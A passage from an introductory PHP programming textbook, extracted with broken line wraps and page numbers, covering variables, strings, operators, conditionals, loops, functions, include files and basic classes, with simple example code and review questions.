 ties. We’ll begin with detailing where PHP is processed, then look at some of the 
 basic functions to output text, and from there go right into printing text based on a 
 certain condition being true.",NA
Text Output,"You’ll want to be able to display text easily and often. PHP lets you do that, though 
 you’ll need to use proper PHP syntax when creating the code. Otherwise, your 
 browser assumes that everything is HTML and outputs the PHP code directly to the 
 browser. Everything looks like text and code mixed up. This will certainly confuse 
 your users! You can use whichever text editor you like to write your PHP code, 
 including Notepad or DevPHP (
 http://sourceforge.net/projects/devphp/
 ).
  
 Our examples demonstrate how similar HTML markup and PHP code look, and what 
 you can do to start noticing the differences between them.
  
 39",NA
Coding Building Blocks,"To write programs in PHP that do something useful, you’ll need to understand 
 blocks of reusable code called functions or methods, as well as how to temporarily 
 store information that cannot be executed in variables. We talk about
  evaluations
 , 
 which allow your code to make intelligent decisions based on mathematical princi-
 ples and user input.",NA
Variables,"Since we assume that some of you haven’t done any programming, we understand 
 that variables may be a new concept. A
  variable
  stores a value, such as the text 
 string“Hello World!” or the integer value
  1
 . A variable can then be reused 
 throughout your code, instead of having to type out the actual value over and over 
 again for the entire life of the variable, which can be frustrating and tedious. Figure 
 3-2 shows a newly created variable that has been assigned a value of
  30
 .
  
  
 PHP page 
  
 <?PHP
  
  $age = 30;
  
  
 Memo
 ry 
  
 $age
  
 30
  
 ?> 
  
  
 Named 
 storage
  
 Figure 3-2. A PHP variable holds a value in memory
  
 In PHP, you define a variable with the following form:
  
 $variable_name = value;
  
 Pay very close attention to some key elements in the form of variables. The dollar 
 sign (
 $
 ) must always fill the first space of your variable. The first character after the 
 dollar sign must be either a letter or an underscore. It can’t under any 
 circumstances be a number; otherwise, your code won’t execute, so watch those 
 typos!
  
 Coding Building Blocks
  
 |
  
 43",NA
Strings,"Variables can hold more than just numbers. They can hold characters and
  strings
 , 
 which are particular sequences of individual characters (see Figure 3-6).
  
 String
  
  
 = testing
  
 t
  
 e
  
 s
  
 t
  
 i
  
 n
  
 g
  
 Characters
  
 Figure 3-6. How individual characters form a string
  
 A string can be used directly in a function call or stored in a variable. In Example 3-
 11, we create the exact same string twice: first we store it in a variable, and then we 
 place the string directly into a function.
  
 Example 3-11. Working with strings
  
 <?php 
  
 $my_string = ""Margaritaville - Suntan Oil Application!""; 
  
 echo ""Margaritaville - Suntan Oil Application!""; 
  
 ?>
  
 In Example 3-12, the first string is stored in the variable
  $my_string
 , while the sec-
 ond string is used in the
  echo
  function and
  isn’t
  stored. Remember to save your 
 favor-ite strings into variables if you plan on using them more than once!
  
 Strings are flexible. You can even insert variables such as
  $my_string
  into string defi-
 nitions, provided that you use double quotes to start and end your string. On the 
 other hand, using single quotes to start and end your string does not allow a 
 variable to be placed in the string.
  
 50
  
 |
  
 Chapter 3: Exploring PHP",NA
Concatenation,"Concatenation combines one or more text strings and variables, as shown in 
 Example 3-18. When performing this combination, you save yourself the hassle of 
 creating numerous
  echo
  statements; in other words, you build up a string and use it.
  
 Example 3-18. Concatenating strings together
  
 <?php 
  
 $my_string = ""Hello Max. My name is: ""; 
  
 $newline = ""<br />""; 
  
 echo $my_string . ""Paula"" . $newline; 
  
 echo ""Hi, I'm Max. Who are you? "" . $my_string . $newline; 
  
 echo ""Hi, I'm Max. Who are you? "" . $my_string . ""Paula""; 
  
 //The last line is the same as echo ""Hi, I'm Max. Who are you? $my_string Paula""; ?>
  
 The output of your code looks like Figure 3-7 in your browser window.
  
  
 Figure 3-7. Concatenation output
  
 Variables and text strings are joined together with a period (
 .
 ). This can be done 
 multiple times, as shown in Figure 3-8.
  
 String1 . String2 . String3
  
 String1 String2 String3
  
 Figure 3-8. How strings come together with concatenation
  
 54
  
 |
  
 Chapter 3: Exploring PHP",NA
Constants,"You can define constants in your program. A constant, like its name implies, cannot 
 change its value during the execution of your program. It’s defined using the
  define( 
 ) 
 function, which takes the name of the constant as the first parameter and the 
 values as the second parameter. The definition of a constant is global and can be 
 defined as any simple (scalar) data type, such as a string or number. You can get the 
 value of a constant by simply specifying its name, as shown in Example 3-20, or by 
 using the 
 constant
  function. Unlike how you handle variables, you should
  not
  put the 
 dollar sign (
 $
 ) before a constant.
  
 If the name of a constant is stored in a variable or the result of a function, you’ll 
 need to use the function
  constant(
 name
 )
  to return the constant’s value. It takes a 
 parame-ter as the name of the constant and returns its value. Or you could use
  
 get_defined_ constants( )
  to return a list (as an array) of all your defined constants. If 
 you’re unsure about the arguments to a function, you can search using the PHP site 
 (
 http:// www.php.net
 ) to find function parameters and return values.
  
 These are the differences between constants and variables:
  
 • It’s common practice to capitalize a variable name for constants.
  
 • Constants do not have a dollar sign (
 $
 ) at the start of their names.
  
 • Constants can be defined only by using the
  define
  function, not by simple 
  
 assignment.
  
 • Constants are defined and accessed globally.
  
 • Constants cannot be redefined or undefined once they have been set.
  
 • Constants can evaluate only to scalar values.
  
 Coding Building Blocks
  
 |
  
 55",NA
Doing Math,"Variables can hold numbers, too, and it’s useful to perform mathematical 
 operations on those numbers. All fundamental mathematical functions are 
 available using PHP. You may feel like you’re back in middle school algebra, but the 
 basic functions are just like they were then: adding, subtracting, multiplying, and 
 dividing. In Example 3-22, the divide (
 /
 ) operator calculates the percentage from its 
 operands, sunny days and total days in a year, to get a percentage of approximately 
 82.
  
 Example 3-22. PHP mathematical function usage
  
 <?php> 
  
 $sunny_days=300; 
  
 $Margaritaville_sunny_days_ratio=$sunny_days/365; 
  
 echo $Margaritaville_sunny_days_ratio; 
  
 ?>
  
 In Figure 3-9, the 82 percent outcome from our example code displays in your 
 browser window.
  
  
 Figure 3-9. Mathematical operation output
  
 PHP also supports the mathematical operations listed in Table 3-3.
  
 Table 3-3. The basic mathematical operators
  
 Mathematical 
 operator
  
  
 Name
  
 Example
  
 Result
  
 +
  
 Addition
  
 2+2
  
 4
  
 -
  
 Subtraction
  
 2-1
  
 1
  
 *
  
 Multiplication
  
 2*2
  
 4
  
 /
  
 Division
  
 2/2
  
 1
  
 %
  
 Modulo 
 (remainder)
  
 2%1
  
 0
  
 The operators can take whole numbers or decimal numbers as their input.
  
 Coding Building Blocks
  
 |
  
 57",NA
Chapter 3 Questions,"Question 3-1 
  
  
 How does PHP output in your browser if you don’t use
  <?php
  and
  ?>
 ?
  
 Question 3-2 
  
  
 What do you combine with PHP code to create a dynamic web site?
  
 Question 3-3 
  
  
 How do you add comments to your code?
  
 Question 3-4 
  
  
 What are the three types of 
 comments?
  
 Question 3-5 
  
  
 How is a semicolon used in PHP?
  
 Question 3-6 
  
  
 What does a variable store?
  
 Question 3-7 
  
  
 How do you define a variable in PHP?
  
 Question 3-8 
  
  
 Are variables in PHP case-
 sensitive?
  
 Question 3-9 
  
  
 How are functions used with a chunk of PHP code?
  
 Question 3-10 
  
  
 What is
  PHP_SELF
 ?
  
 Question 3-11 
  
  
 How do you escape a single quote?
  
 Question 3-12 
  
  
 What does
  strcmp
  do?
  
 Question 3-13 
  
  
 What combines one or more text strings as a 
 variable?
  
 Question 3-14 
  
  
 What is the result of combining a string with another data 
 type?
  
 See the “Chapter 3” section in the Appendix for the answers to these questions.
  
 Chapter 3 Questions
  
 |
  
 61",NA
CHAPTER 4,NA,NA
PHP Decision-Making ,"4
  
 In the last chapter you started to get a feel for programming with PHP and some 
 code basics. Now it’s time to expand your comfort, knowledge, and ability with PHP. 
 We’ll start with expressions and statements.",NA
Expressions,"There are several building blocks of coding that you need to understand: 
 statements, expressions, and operators. A
  statement
  is code that performs a task. 
 Statements are made up of expressions and operators. An
  expression
  is a piece of 
 code that evalu-ates to a value. A value can be a number, a string of text, or a
  
 Boolean
 .
  
  
 A Boolean is an expression that results in a value of either
  TRUE
  or 
 FALSE
 . For example, the expression 10 > 5 (10 is greater than 5) is a 
 Boolean expression because the result is
  TRUE
 . All expressions that 
 con-tain
  relational operators
 , such as the less-than sign (
 <
 ), are 
 Boolean.
  
 Some of the Boolean operators are
  AND
 ,
  OR
 , and
  NOT
 . Boolean 
 operators 
  
 will be discussed at greater length later in this chapter.
  
 An
  operator
  is a code element that acts on an expression in some way. For instance, 
 a minus sign (
 –
 ) can be used to tell the computer to decrement the value of the 
 expres-sion after it from the expression before it. For example:
  
 $account_balance=$credits-$debits;
  
 The most important thing to understand about expressions is how to combine them 
 into compound expressions and statements using operators. So, we’re going to look 
 at operators used to turn expressions into more complex expressions and 
 statements.
  
 The simplest form of expression is a literal or a variable. A
  literal
  evaluates to itself. 
 Some examples of literals are numbers, strings, and constants. A
  variable
  evaluates 
 to the value assigned to it. For instance, any of the expressions in Table 4-1 are 
 valid.
  
 62",NA
Operator Concepts,"PHP has many types of operators, including:
  
 • Arithmetic operators
  
 • Array operators
  
 • Assignment operators
  
 • Bitwise operators
  
 • Comparison operators
  
 • Execution operators
  
 • Incrementing/decrementing operators
  
 • Logical operators
  
 • String operators
  
 The 
 operators 
 are 
 listed 
 as 
 found 
 on
  
 http://www.php.net/manual/en/language.operators. php
 . There are some operators 
 we’re not going to discuss so you can get up and run-ning with PHP as quickly as 
 possible. These include some of the casting operators that we’ll just skim the 
 surface of for now. Each operator has four critical properties in addition to its core 
 functionality:
  
 64
  
 |
  
 Chapter 4: PHP Decision-Making",NA
Number of Operands,"Different operands take different numbers of operands. Many operators are used to 
 combine two expressions into a more complex single expression; these are called 
 binary operators
 . Binary operators include addition, subtraction, multiplication, 
 and division.
  
 Other operators take only one operand; these are called
  unary operators
 . Think of 
 the negation operator (
 -
 ) that multiplies a numeric value by –1. The preincrement 
 and predecrement operators described in Chapter 3 are also unary operators.
  
 A
  ternary operator
  takes three operands. The shorthand for an
  if
  statement, which 
 we’ll talk about later when discussing conditionals, takes three operands.",NA
Types of Operands,"You need to be mindful of the type of operand on which an operator is meant to 
 work because certain operators expect their operands to be of particular data 
 types. PHP attempts to make your life as easy as possible by automatically 
 converting oper-ands to the data type that an operator is expecting. There are 
 times, however, that an automatic conversion isn’t possible.
  
 Mathematical operators are an example of where you need to be careful with your 
 types. They take only numbers as operands. For example, when you try to multiply 
 two strings, PHP can convert the strings to numbers. While
  ""Becker"" * ""Furniture""
  is 
 not a valid expression, it returns zero. On the other hand, an expression that is con-
 verted without an error is
  ""70"" * ""80""
 . This evaluates to
  5600
 . Although
  70
  and
  80
  are 
 strings, PHP is able to convert them to the number type required by the mathemati-
 cal operator.
  
 There will be times when you want to explicitly set or convert a variable’s type. 
 There are two ways to do this in PHP: first, by using
  settype
  to actually change the 
 data type; or second, by casting, which temporarily converts the value. PHP uses 
 casting
  to convert data types. When PHP does the casting for you automatically, it’s 
 called
  implicit casting
 . You can also specify data types explicitly, but it’s not some-
 thing that you’ll likely need to do.
  
 Operator Concepts
  
 |
  
 65",NA
Relational Operators,"In Chapter 3 we discussed assignment and math operators. Relational operators 
 pro-vide the ability to compare two operands and return either
  TRUE
  or
  FALSE
  
 regarding the comparison. An expression that returns only
  TRUE
  or
  FALSE
  is called a 
 Boolean expression, which we discussed in the previous chapter. These 
 comparisons include tests for equality and less than or greater than. These 
 comparison operators allow you to tell PHP when to do something based on 
 whether a comparison is true so that decisions can be made in your code.
  
 Equality
  
 The equality operator, a double equals sign (
 ==
 ), is used frequently. Using the single 
 equals sign (
 =
 ) in its place is a common logical error in programs, since it assigns 
 val-ues instead of testing equality.
  
 If the two operands are equal,
  TRUE
  is returned; otherwise,
  FALSE
  is returned. If 
 you’re echoing your results,
  TRUE
  is printed as
  1
  in your browser.
  FALSE
  is
  0
  and 
 won’t dis-play in your browser.
  
 It’s a simple construct, but it also allows you to test for conditions. If the operands 
 are of different types, PHP attempts to convert them before comparing.
  
 Operator Concepts
  
 |
  
 69",NA
Conditionals,"Conditionals, like variables, form a building block in our foundation of PHP devel-
 opment. They alter a script’s behavior according to the criteria set in the code. 
 There are three primary conditionals in PHP:
  
 Conditionals
  
 |
  
 71",NA
The if Statement,"The
  if
  statement offers the ability to execute a block of code if the supplied condi-
 tion is
  TRUE
 ; otherwise, the code block doesn’t execute. The condition can be any 
 expression, including tests for nonzero, null, equality, variables, and returned 
 values from functions.
  
 No matter what, every single conditional you create includes a conditional clause. If 
 a condition is
  TRUE
 , the code block in curly braces (
 {}
 ) is executed. If not, PHP 
 ignores it and moves to the second condition, continuing through all clauses 
 written until PHP hits an
  else
 . Then it automatically executes that block only if the
  IF
  
 condi-tion proves to be
  FALSE
 ; otherwise, it moves on. The curly braces are not 
 required if you have only one line of code to execute in the block. An
  else
  statement 
 is not always required.
  
 Figure 4-2 demonstrates how an
  if
  statement works. The
  else
  block always needs to 
 come last and be treated as if it’s the default action. This is similar to the semicolon 
 (
 ;
 ). Common true conditions are:
  
 •
  $var
 , if
  $var
  has a value other than the empty set (
 0
 ), an empty string, or
  NULL
  
 •
  isset ($var)
 , if
  $var
  has any value other than
  NULL
 , including the empty set or an 
  
 empty string
  
 •
  TRUE
  or any variation thereof
  
 if 
  
 Condition
  
 $x==5
  
 false
  
  
 true 
  
  
  
 else 
  
 code 
  
  
 code
  
 Figure 4-2. Execution branching based on an expression
  
 72
  
 |
  
 Chapter 4: PHP Decision-Making",NA
The ? Operator,"The
  ?
  operator is a ternary operator, which means it takes three operands. It works 
 like an
  if
  statement but returns a value from one of the two expressions. The condi-
 tional expression determines the value of the expression. A colon (
 :
 ) is used to 
 sepa-rate the expressions, as shown here:
  
 {expression} ? return_when_expression_true : return_when_expression_false;
  
 Example 4-8 tests a value and returns a different string based on whether it’s
  TRUE
  
 or 
 FALSE
 .
  
 Example 4-8. Using the ? operator to create a message
  
 <?php 
  
 $logged_in = TRUE; 
  
 $user = ""Admin""; 
  
 $banner =
  ($logged_in==TRUE)?""Welcome back, $user!"":""Please login.""; 
  
 echo ""$banner""; 
  
 ?>
  
 Example 4-8 produces:
  
 Welcome back, Admin!
  
 This can be pretty useful for checking errors. Now, let’s look at a statement that lets 
 you check an expression against a list of possible values to pick the executable code.
  
 74
  
 |
  
 Chapter 4: PHP Decision-Making",NA
The switch Statement,"The
  switch
  statement compares an expression to numerous values. It’s very com-
 mon to have an expression, such as a variable, for which you’ll want to execute dif-
 ferent code for each value stored in the variable. For example, you might have a 
 variable called
  $action
 , which may have the values
  add
 ,
  modify
 , and
  delete
 . The 
 switch
  
 statement makes it easy to define a block of code to execute in response to each of 
 those values.
  
 To illustrate the difference between using the
  if
  statement and the
  switch
  statement 
 to test a variable for several values, we’ll show you the code for the
  if
  statement (in 
 Example 4-9), and then for the
  switch
  statement (in Example 4-10).
  
 Example 4-9. Using if to test for multiple values
  
 if ($action == ""ADD"") {
  
  
  echo ""Perform actions for adding."";
  
  
  echo ""As many statements as you like can be in each block.""; 
  
 } 
  
 elseif ($action == ""MODIFY"") {
  
  
  echo ""Perform actions for modifying.""; 
  
 } 
  
 elseif ($action == ""DELETE"") {
  
  
  echo ""Perform actions for deleting.""; 
  
 }
  
 Example 4-10. Using switch to test for multiple values
  
 switch ($action) {
  
  
  case ""ADD"":
  
  
  
  echo ""Perform actions for adding."";
  
  
  
  echo ""As many statements as you like can be in each block."";
  
  
  
  break;
  
  
  case ""MODIFY"":
  
  
  
  echo ""Perform actions for modifying."";
  
  
  
  break;
  
  
  case ""DELETE"":
  
  
  
  echo ""Perform actions for deleting."";
  
  
  
  break; 
  
 }
  
 The
  switch
  statement works by taking the value after the
  switch
  keyword and com-
 paring it to the cases in the order in which they appear. If no case matches, the code 
 isn’t executed. Once a case matches, the code is executed. The code in subsequent 
 cases also executes until the end of the
  switch
  statement or until a
  break
  keyword. 
 This is useful for processes that have several sequential steps. If the user has 
 already done some of the steps, he can jump into the process where he left off.
  
 Conditionals
  
 |
  
 75",NA
Looping,"Now that you’ve changed the flow of your PHP program based on comparisons, you 
 need to learn that if you want to repeat a task until a comparison is
  FALSE
 , you’ll 
 need to use looping. Each time the code in the loop executes, it is called an
  iteration
 . 
 This is useful for many common tasks, such as displaying the results of a query by 
 loop-ing through the returned rows. PHP provides the
  while
 ,
  for
 , and
  do ... while
  con-
 structs to perform loops.
  
 Each of the loop constructs requires two basic pieces of information. First, the 
 condi-tion to stop looping is defined just like the comparison in an
  if
  statement. 
 Second, the code to perform is also required and specified either on a single line or 
 within curly braces. A logical error would be to omit the code from a loop that relies 
 on the code executed to cause the loop to stop, causing an infinite loop.
  
 Looping
  
 |
  
 77",NA
while Loops,"The
  while
  loop takes the expression followed by the code to execute. Figure 4-3 illus-
 trates how a
  while
  loop processes.
  
 while loop
  
 condition 
  
 expression
  
 false 
  
 exit 
  
 loop
  
 true 
  
 code
  
 Figure 4-3. How a while loop executes
  
 The syntax for a
  while
  loop is:
  
 while (
 expression
 ) 
  
 { 
  
  
 code to  execute
 ; 
  
 }
  
 An example is shown in Example 4-14.
  
 Example 4-14. A sample while loop that counts to 10
  
 <?php 
  
 $num = 1;
  
 while ($num <= 10){
  
  
  print ""Number is $num<br />"";
  
  
  $num++; 
  
 }
  
 print 'Done.'; 
  
 ?>
  
 78
  
 |
  
 Chapter 4: PHP Decision-Making",NA
do … while Loops,"The
  do ... while
  loop takes an expression such as a
  while
  statement but places it at the 
 end. The syntax is:
  
 do { 
  
  
 code to execute
 ; 
  
 } while (
 expression
 );
  
 This loop is useful when you want to execute a block of code at least once 
 regardless of the expression value. For example, let’s count to 10 with this loop, as 
 shown in Example 4-15.
  
 Example 4-15. Counting to 10 with do … while
  
 <?php
  
 $num = 1;
  
 do {
  
  
  echo ""Number  is "".$num.""<br />"";
  
  
  $num++; 
  
 } while ($num <= 10);
  
 echo ""Done."";
  
 ?>
  
 Looping
  
 |
  
 79",NA
for Loops,"for
  loops provide the same general functionality as
  while
  loops, but also provide for a 
 predefined location for initializing and changing a counter value. Their syntax is:
  
 for (
 initialization expression
 ;
  condition expression
 ;
  modification expression
 ){ 
  
 code 
 that is executed
 ; 
  
 }
  
 Figure 4-4 shows a flowchart for a
  for
  loop.
  
 for loop
  
 initialization 
  
 expression
  
 condition 
  
 expression
  
 false
  
 true
  
 modification 
  
 expression
  
 exit 
  
 loop
  
 code
  
 Figure 4-4. How a for loop executes
  
 80
  
 |
  
 Chapter 4: PHP Decision-Making",NA
Breaking Out of a Loop,"PHP provides the equivalent of an emergency stop button for a loop: the
  break
  
 state-ment. Normally, the only way out of a loop is to satisfy the expression that 
 deter-mines when to stop the loop. If the code in the loop finds an error that makes 
 continuing the loop pointless or impossible, you can break out of the loop by using 
 the
  break
  statement. It’s like getting your shoelace stuck in an escalator. It really 
 doesn’t make any sense for the escalator to keep going! But those old-fashioned 
 ones did!
  
 Possible problems you might encounter in a loop include running out of space 
 when you’re writing to a file or attempting to divide by zero. In Example 4-16, we 
 simulate what can happen if you divide based on an unknown entry initialized from 
 a form submission (that could be a user-supplied value). If your user is malicious or 
 just plain careless, she might enter a negative value where you’re expecting a 
 positive value (although this should be caught in your form validation process). In 
 the code that’s executed as part of the loop, the code checks to make sure the
  
 $counter
  is not equal to zero. If it is, the code calls
  break
 .
  
 Looping
  
 |
  
 81",NA
continue Statements,"You can use the
  continue
  statement to stop processing the current block of code in a 
 loop and jump to the next iteration of the loop. It’s different from
  break
  in that it 
 doesn’t stop processing the loop entirely. You’re basically skipping ahead to the 
 next iteration. Make sure you are modifying your test variable before the
  continue
  
 state-ment, or an infinite loop is possible. Example 4-17 shows the preceding 
 example using
  continue
  instead of
  break
 .
  
 Example 4-17. Using continue instead of break
  
 <?php
  
 $counter=-3;
  
 for (;$counter<10;$counter++){
  
  
  //check for division by zero
  
  
  if ($counter==0){
  
  
  
  echo ""Skipping to avoid division by zero.<br>"";
  
  
  
  continue;
  
  
  }
  
  
  echo ""100/$counter "",100/$counter,""<br />""; 
  
 }
  
 ?>
  
 82
  
 |
  
 Chapter 4: PHP Decision-Making",NA
Chapter 4 Questions,"Question 4-1 
  
  
 What is a statement?
  
 Question 4-2 
  
  
 What is a code element that acts on an 
 expression?
  
 Question 4-3 
  
  
 What does an operator combine?
  
 Question 4-4 
  
  
 What is the plus (
 +
 ) 
 sign?
  
 Question 4-5 
  
  
 What is a binary operator?
  
 Question 4-6 
  
  
 What is a ternary operator?
  
 Question 4-7 
  
  
 Do mathematical operators take letters as 
 operands?
  
 Chapter 4 Questions
  
 |
  
 83",NA
CHAPTER 5,NA,NA
Functions,"5
  
 To write PHP programs that contain more than just a couple pages of code and are 
 still organized enough to be useful, you need to understand
  functions
 . Functions let 
 you eliminate repeating the same lines of code over and over in your programs. 
 Func-tions work by assigning a name called a function name to a chunk of code. 
 Then you execute the code by calling that name.
  
 There are hundreds of built-in functions in PHP. For example,
  print_r
  is a function 
 that prints readable information about a variable in plain English rather than code.
  
 If given a string, integer, or float, the value itself is printed with the
  print_r
  function. 
 If given an array, values are shown as keys and elements. A similar format is used 
 for objects. In PHP 5.0,
  print_r
  and
  var_export
  show protected and private properties 
 of objects.
  
 Functions run the gamut from
  aggregate_info
  to
  imap_ping
  through
  pdf_open_image
 . 
 Since there are so many, we can only cover some basics in this chapter, but we’ll 
 give you enough information that you’ll be using functions like a pro in no time at 
 all. You can search
  http://www.php.net
  for an exhaustive list of functions.
  
 Specifically, we’ll go over the following:
  
 • How to create a function, give it a name, and execute that function
  
 • How to send values to a function and use them in the function
  
 • How to return values from a function and use them in your code
  
 • How to verify that a function exists before you try using it
  
 When to split out code into a function is a bit of a judgment call. Certainly, if you 
 find yourself repeating several lines of code over and over, it makes sense to pull 
 that code into its own function. That will make your code easier to read and also 
 prevent you from having to make a lot of changes if you decide to do something 
 different with that block of code, as it’s then in only one spot, not numerous places 
 where you’d have to search and replace to change it.
  
 85",NA
Calling Functions,"Functions that are built into PHP can be called from any PHP script. When you call 
 functions, you are executing the code inside them, except the code is reusable and 
 more maintainable. One built-in function, shown in Example 5-2, is
  phpinfo
 . It 
 returns configuration and technical information about your PHP installation.
  
 Example 5-2. Displaying information about the PHP environment
  
 <?php 
  
 phpinfo( ); 
  
 ?>
  
 The function helps you to diagnose common problems and issues. You may find 
 that this is one of the most helpful places to look when checking to see whether you 
 meet the requirements of a PHP script. Figure 5-2 shows only part of the 
 information con-tained on this page. If a function call doesn’t work, this page helps 
 diagnose whether PHP has been compiled with the necessary modules. Don’t leave 
 a script using 
 phpinfo( ):
  on a production web server, however, because it discloses 
 information about your server that could be used by hackers for malicious intent.
  
 To call a function, write the name of the function, an opening parenthesis (
 (
 ), the 
 parameters, a closing parenthesis (
 )
 ), and then a semicolon (
 ;
 ). It would look like 
 this:
  function_name
 (
 parameters
 );
 . Function names aren’t case-sensitive, so calling 
 phpinfo
  is the same as calling
  PhpInfo
 . As shown in Example 5-3, this is what calling 
 a function looks like:
  md5($mystring);
 .
  
 Most functions have return values that you’ll either use in a comparison or store in 
 a variable. A great place to start is the
  md5
  function.
  md5
  is a one-way hash function 
 similar to a checksum used to verify the integrity of a string.
  md5
  converts a 
 message into a fixed string of digits, called a
  message digest
 . You can then perform a 
 hashcheck
 , comparing the calculated message digest against a message digest 
 decrypted with a public key to verify that the message was not tampered with. 
 Example 5-3 creates a 128-bit long
  md5
  signature of the string
  ""mystring""
 .
  
 Example 5-3. Creating an md5 signature
  
 <?php
  
  
  $mystring = ""mystring"";
  
  
  $signature = md5($mystring);
  
  
  echo $signature; 
  
 ?>
  
 Example 5-3 displays the following output:
  
 169319501261c644a58610f967e8f9d0
  
 The return value, which is discussed in detail in this chapter, is assigned to the vari-
 able
  $signature
 , which then displays the output.
  
 Calling Functions
  
 |
  
 87",NA
Defining Functions,"There are already many functions built into PHP. However, you can define your 
 own and organize your code into functions. To define your own functions, start out 
 with the
  function
  statement:
  
 function
  some_function
 ([
 arguments
 ]) {
  code to execute;
  }
  
 The brackets (
 [ ]
 ) mean optional. The code could also be written with
  optional_ 
 arguments
  in place of
  [
 arguments
 ]
 . The
  function
  keyword is followed by the function 
 name. Function names abide by the same rules as other named objects, such as 
 vari-ables, in PHP. A pair of parentheses (
 ( )
 ) must come next. If your function has 
 parameters, they’re specified within the parentheses. Finally, the code to execute is 
 listed between curly braces, as seen in the previous code example.
  
 You can define functions anywhere in your code and call them from virtually any-
 where. The scope rules are described in Chapter 3. As you may remember, the
  
 scope 
 of a variable is the context within which it’s defined. For the most part, all 
 PHP vari-ables have only a single scope. A single scope spans included and required 
 files as well. The function is defined on the same file or included in an include file. 
 Func-tions can have parameters and return values that allow you to reuse code.
  
 To create your own function that simply displays a different hello message, you 
 would write:
  
 <?php 
  
 function hi( ) 
  
 {
  
  
  echo (""Hello from function-land!""); 
  
 } 
  
 //Call the function 
  
 hi( ); 
  
 ?>
  
 which displays:
  
 Hello from function-land!
  
 The
  hi
  function doesn’t take any parameters, so you don’t list anything between the 
 parentheses. Now that you’ve defined a simple function, let’s mix in some parame-
 ters.",NA
Parameters,"Parameters provide a convenient way to pass information to a function when you 
 call it without having to worry about variable scope. In PHP, you don’t have to 
 define what type of data a parameter holds—only the parameters’ names must be 
 specified.
  
 Defining Functions
  
 |
  
 89",NA
Parameter References,"When you pass an argument to the function, a local copy is made in the function to 
 store the value. Any changes made to that value affect only the local copy of the 
 vari-able in the function, not the source of the parameter. You can define 
 parameters that modify the source variable by defining reference parameters.
  
 Reference parameters
  define references by placing an ampersand (
 &
 ) directly before 
 the parameter in the function’s definition.
  
 Let’s modify the
  capitalize
  function from Example 5-5 to take a reference variable for 
 the string to
  capitalize
 , which is shown in Example 5-6.
  
 Example 5-6. Modifying capitalize( ) to take a reference parameter
  
 <?php 
  
 function capitalize( &$str, $each=TRUE ){ 
  
 {   // First, convert all characters to lowercase
  
  
  $str = strtolower($str);
  
  
  if ($each === true) {
  
   
  $str = ucwords($str);
  
  
  } else {
  
   
  $str{0} = strtoupper($str{0});
  
  
  } 
  
 } 
  
 $str = ""hEllo WoRld!""; 
  
 capitalize( $str ); 
  
 echo $str; 
  
 ?>
  
 Defining Functions
  
 |
  
 91",NA
Including and Requiring PHP Files,"To make your code more readable, you can place your functions in a separate file. 
 Many PHP add-ons that you download off the Internet contain functions already 
 placed into files that you simply
  include
  in your PHP program. However, PHP pro-
 vides four functions that enable you to insert code from other files:
  
 •
  include
  
 •
  require
  
 •
  include_once
  
 •
  require_once
  
 All of the
  include
  and
  require
  functions take a local file as input.
  require
  and 
 include
  
 functions are pretty similar in their functionality except for the way in which they 
 handle an irretrievable resource. For example,
  include
  and
  include_once
  pro-vide a 
 warning if the resource cannot be retrieved and tries to continue execution of the 
 program. The
  require
  and
  require_once
  functions provide stop processing of the 
 particular page if they can’t retrieve the resource. Now we’re going to get more spe-
 cific about these four functions.",NA
The include Statement,"The
  include
  statement allows you to include and attach other PHP scripts to your 
 own script. You can think of it as simply taking the included file and inserting it into 
 your PHP file. Example 5-7 is called
  add.php
 .
  
 Example 5-7. A sample include file called add.php
  
 <?php 
  
 function add( $x, $y ){
  
  return $x + $y; 
  
 } 
  
 ?>
  
 Example 5-8 assumes that
  add.php
  is in the same directory as the script.
  
 92
  
 |
  
 Chapter 5: Functions",NA
Testing a Function,"If compatibility with various PHP versions is especially important to your script, it’s 
 useful to be able to check for the existence of functions. The function
  function_ exists
  
 does just what you’d expect. It takes a string with a function’s name and returns
  
 TRUE
  or
  FALSE
  depending on whether the function has been defined. For example, 
 the following code tests a function:
  
 <?php 
  
 $test=function_exists(""test_this""); 
  
 if ($test == TRUE) 
  
 {
  
  
  echo ""Function test_this exists.""; 
  
 } 
  
 else 
  
 {
  
  
  echo ""Function test_this does not exist."";
  
  
  //call_different_function( ); 
  
 } 
  
 ?>
  
 This code displays the following:
  
 Function test_this does not exist.
  
 The
  Function test_this does not exist
  message displays because you haven’t defined the 
 function
  test_this
 .
  
 You’ve learned how to define functions and their parameters and how to pass infor-
 mation back and forth from them; plus, we’ve given you some good examples of 
 how to troubleshoot potential function problems.
  
 Next, we’ll introduce an alternate style of programming called Object-Oriented 
 (OO) programming. PHP 5.0 has a fully developed OO interface. There is continu-
 ous debate about which type of coding is better, and really, neither is better or 
 worse than the other; it’s mostly a style issue along with personal preference.
  
 Defining Functions
  
 |
  
 95",NA
Object-Oriented Programming,"Object-Oriented programming follows the same goals that we discussed when 
 intro-ducing functions, principally to make reusing code easier. It uses
  classes
  to 
 group functions and variables together as an object. It may help to think of objects 
 as little black boxes that can do work without you knowing exactly how it’s done.
  
 They still use functions, but they get a new name when defined in classes. These are 
 called
  methods
 . The class works as a blueprint for creating objects of the class-
 defined type. Variables can still be defined in methods, but they gain the new ability 
 to be defined as part of the class itself.
  
 When a new object is created from a class, it is called an
  instance
  of that class. Any 
 variables that are defined in the class get separate storage space in each instance. 
 The separate storage for variables provides the instance of an object with the 
 ability to remember information between method executions. Figure 5-3 
 demonstrates the relationship between a class and its components.
  
 Class example
  
 Variable $a
  
 value
  
 method test1()
  
 code
  
 method test2()
  
 code
  
  
  
 Figure 5-3. A class can contain methods and attributes (variables)
  
 If you’re new to the concepts of OO programming, don’t worry about understand-
 ing everything right away. We’ll work with a class in Chapter 8, so it’s good enough 
 just to know how to call the methods. In fact, anything that can be done with objects 
 can be done with plain functions. It’s just a matter of style and personal preference.",NA
Creating a Class,"Classes are typically stored in separate files for reuse. Let’s build an object called
  
 Cat 
 that has three methods:
  meow
 ,
  eat
 , and
  purr
 . The
  class
  construct defines a class 
 and its name. Class names follow the same naming rules as variables and functions. 
 The code that makes up the class is placed between curly braces. This example 
 creates the
  Cat
  class without defining any methods or variables.
  
 96
  
 |
  
 Chapter 5: Functions",NA
Creating an Instance,"Example 5-10 not only defines the class but also creates an instance of it. The
  new 
 keyword tells PHP to return a new instance of the
  Cat
  class. Although the class 
 doesn’t do anything, you can tell that it’s defined as an object. The class is a blue-
 print for building instances. The class specifies what is included in each new 
 instance of that class. Each instance can do everything the class defines within the 
 context of the instance.",NA
Methods and Constructors,"Methods are the functions defined within the class. They work within the environ-
 ment of the class, including its variables. For classes, there is a special method 
 called a
  constructor
  that’s called when a new instance of a class is created to do any 
